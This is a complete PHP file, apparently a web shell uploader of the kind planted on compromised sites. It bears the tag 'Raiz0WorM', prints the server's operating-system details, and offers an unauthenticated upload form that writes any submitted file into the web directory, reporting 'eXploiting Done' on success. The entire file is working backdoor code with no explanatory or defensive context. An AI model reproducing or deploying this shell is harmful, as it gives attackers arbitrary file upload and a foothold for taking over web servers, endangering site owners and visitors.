 <?php /*976489508976489508*/ ?><?php /*457563643457563643*/ ?><?php
echo "Raiz0WorM";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
  if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
  echo "eXploiting Done";
  } else {
  echo "Failed to Upload.";
  }
}
?>
